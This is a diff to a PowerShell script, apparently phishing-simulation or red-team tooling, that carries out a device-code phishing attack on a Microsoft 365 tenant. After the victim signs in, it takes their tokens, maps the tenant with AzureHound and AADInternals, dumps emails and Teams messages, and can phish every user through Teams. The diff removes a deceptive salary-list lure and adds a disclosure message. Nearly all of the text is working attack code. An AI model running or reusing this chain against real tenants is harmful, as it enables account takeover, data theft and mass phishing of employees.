@@ -30,7 +30,7 @@ Write-Output "AADInternals module has been imported."
 if (!(Get-Module -ListAvailable -Name TokenTactics)) {
     # Download the latest TokenTactics zip if the module is not available
     Write-Output "TokenTactics not found, downloading latest version into current working directory."
-    Invoke-WebRequest -Uri https://github.com/rvrsh3ll/TokenTactics/archive/refs/heads/main.zip -OutFile tokentactics.zip
+    Invoke-WebRequest -Uri https://github.com/mellonaut/TokenTactics/archive/refs/heads/main.zip -OutFile tokentactics.zip
 
     if (Test-Path -Path .\tokentactics) {
         Remove-Item -Path .\tokentactics -Recurse -Force
@@ -50,11 +50,13 @@ Write-Output "TokenTactics module has been imported."
 if ([string]::IsNullOrWhiteSpace($Token)) {
     # If $Token is not specified, just call Get-AzureToken for Graph
     Write-Output "`$Token is not specified. Generating new device code."
+    Invoke-ClearToken -Token All
+    Write-Output "Clearing any previous tokens for a clean run."
     Get-AzureToken -Client Graph    
 } else {
     # If $Token is specified, use it with the CaptureCode parameter
     Write-Output "Using specified access token $Token."
-    Get-AzureToken -Client Graph -CaptureCode $response.access_token # $Token
+    Get-AzureToken -Client Graph -CaptureCode $Token
 }
 
 
@@ -67,9 +69,6 @@ $acc = Read-AADIntAccessToken $access
 $user = $acc.upn
 $domain = $user.Split("@")[1]
 Write-Output "$user took the bait."
-
-### Azurehound 
-
 
 # Assuming $response and $domain are already set
 $tok = $response.refresh_token
@@ -117,12 +116,8 @@ Write-Output "Cleaned up the downloaded zip file."
 # Run AzureHound with the specified parameters
 Write-Output "Running Azurehound."
 & $exePath -r $tok list --tenant $domain -o .\azurehound.json
-
-
-# Execute the AzureHound command
-# & $azureHoundCommand -r $tok list --tenant $domain -o .\azurehound.json 
-
 Write-Output "AzureHound command executed for $os."
+
 
 # AAdInternals recon
 $core=Invoke-RefreshToAzureCoreManagementToken -domain $domain
@@ -179,13 +174,8 @@ $jsonData | Out-File -FilePath "members.json"
 # Invoke-RefreshToMSGraphToken -UseCAE -Domain $domain
 # if ( $global:MSGraphTokenValidForHours -gt 23) { "MSGraph token is CAE capable, token is good for 24 hours. For more information: https://learn.microsoft.com/en-us/azure/active-directory/conditional-access/concept-continuous-access-evaluation " }
 
-# Email
-# dump emails via graph with tokentactics
-$outlook=Invoke-RefreshToOutlookToken -domain $domain -refreshToken $response.refresh_token
-Add-AADIntAccessTokenToCache -AccessToken $outlook.access_token -RefreshToken $outlook.refresh_token
 
-$OutlookToken.refresh_token
-$OutlookToken.access_token
+# Email
 
 # Refresh to Graph, Dump emails
 Write-Output "Dumping last 200 emails from inbox"
@@ -206,11 +196,6 @@ $msgs = Get-AADIntTeamsMessages -AccessToken $MSTeamsToken.access_token | Format
 $jsonData = $msgs | ConvertTo-Json
 $jsonData | Out-File -FilePath "$user.teams.json"
 
-# Send payload link to all users in tenant
-# Example message content
-if(!($messageContent)){ $messageContent = "Hey! Someone left the list of upcoming terminations and their salaries on the share drive, you won't believe who they're cutting <a href='https://decoy.com/contractors'>Decoy Contractors</a>."
-}
-
 # Example Teams message information
 $teamsMessage = @{
     Body = @{
@@ -223,64 +208,62 @@ $teamsMessage = @{
 $retryDelay = 5
 
 
-# Send Teams message to each user with a retry mechanism
-if (![string]::IsNullOrWhiteSpace($teamsUser)) {
-    # If $teamsUser is specified, send the message only to that user
+# Set a default message if none is provided
+if (-not $messageContent) {
+    $messageContent = "You have taken the bait in a phishing simulation. This message is to simulate an attacker taking control of this account. Please follow up with your IT security team."
+}
+
+# Function to handle message sending with retry logic
+function Send-TeamsMessageWithRetry {
+    param(
+        [string]$Recipient,
+        [string]$Message
+    )
+
     $retryCount = 0
     $maxRetries = 3
-    
-    do {
+    $retryDelay = 5
+
+    while ($retryCount -lt $maxRetries) {
         try {
-            Send-AADIntTeamsMessage -Recipients $teamsUser -Message $teamsMessage
-            Write-Host "Message sent to $teamsUser successfully."
-            break  # If successful, exit the retry loop
+            Send-AADIntTeamsMessage -Recipients $Recipient -Message $Message
+            Write-Host "Message sent to $Recipient successfully."
+            return
         } catch {
-            Write-Host "Error sending message to $teamsUser. Retrying in $retryDelay seconds..."
+            Write-Host "Error sending message to $Recipient. Retrying in $retryDelay seconds..."
             Start-Sleep -Seconds $retryDelay
             $retryCount++
         }
-    } while ($retryCount -lt $maxRetries)
-} else {
-    # If $teamsUser is not specified, loop through the $users array and send messages
-    foreach ($user in $users) {
-        $retryCount = 0
-        $maxRetries = 3
-        $recipient = $user.UserPrincipalName
-
-        do {
-            try {
-                Send-AADIntTeamsMessage -Recipients $recipient -Message $teamsMessage
-                Write-Host "Message sent to $recipient successfully."
-                break  # If successful, exit the retry loop
-            } catch {
-                Write-Host "Error sending message to $recipient. Retrying in $retryDelay seconds..."
-                Start-Sleep -Seconds $retryDelay
-                $retryCount++
-            }
-        } while ($retryCount -lt $maxRetries)
     }
+
+    Write-Host "Failed to send message to $Recipient after $maxRetries attempts."
 }
 
-# Open Mailboxz in browser with Burp, paste into repeater
-Read-Host "Pausing here. Press enter to open users inbox in browser or Ctrl+C to cancel"
+# Conditional logic for handling $teamsUser
+if ($teamsUser) {
+    if ($teamsUser -eq "all") {
+        foreach ($user in $users) {
+            Read-Host "Warning: This will will attempt to send your phishing message to every user in the tenant. Do you want to continue?"
+            Write-Output "You like to party."
+            Write-Output "Setting status message to 'Gone Phishin' and going wide."
+            Set-AADIntTeamsStatusMessage -Message "Gone Phishin'" -AccessToken $MSTeamsToken.access_token -Verbose
+            
+            Write-Output "Sending Teams messages..."
+            Send-TeamsMessageWithRetry -Recipient $user.UserPrincipalName -Message $messageContent
+        }
+    } else {
+        Write-Output "Setting user status message to 'Gone Phishin'"
+        Set-AADIntTeamsStatusMessage -Message "Gone Phishin'" -AccessToken $MSTeamsToken.access_token -Verbose
+        Send-TeamsMessageWithRetry -Recipient $teamsUser -Message $messageContent
+    }
+} else {
+    Write-Host "No Teams user specified. Skipping message sending."
+}
+
+# Open Mailbox in browser with Burp, paste into repeater
+Write-Output "Would you like to open the user's mailbox in the browser?"
+Read-Host "Press enter for instructions or Ctrl+C to cancel"
 Invoke-RefreshToSubstrateToken -refreshToken $response.refresh_token -domain $domain -Device AndroidMobile -Browser Android
 Invoke-OpenOWAMailboxInBrowser -AccessToken $SubstrateToken.access_token -Device Mac -Browser Edge
 
 }
-
-
-
-
-
-
-# One Drive PoC
-# Create a new OneDriveSettings object
-# Get-WmiObject -Class Win32_NTDomain | select DomainName,DomainGuid
-# $os = New-AADIntOneDriveSettings
-# Get-AADIntOneDriveFiles -OneDriveSettings $os | Format-Table
-# Get-AADIntOneDriveFiles -OneDriveSettings $os -DomainGuid "667965e7-de8e-440d-adc3-371a35474a41" | Format-Table
-
-# Set-AADIntTeamsStatusMessage -Message "My cool status message" -AccessToken $MSTeamsToken.access_token -Verbose
-# if(!(teamsMessage)){ $teamsMessage = "$user has taken the bait in a phishing simulation. This message is to simulate an attacker taking control of the account. Please follow up with your IT security team."}
-# if($teamsUser) { Send-AADIntTeamsMessage -Recipients $teamsUser -Message $teamsMessage } else { Write-Output "Skipping the Teams message."}
-
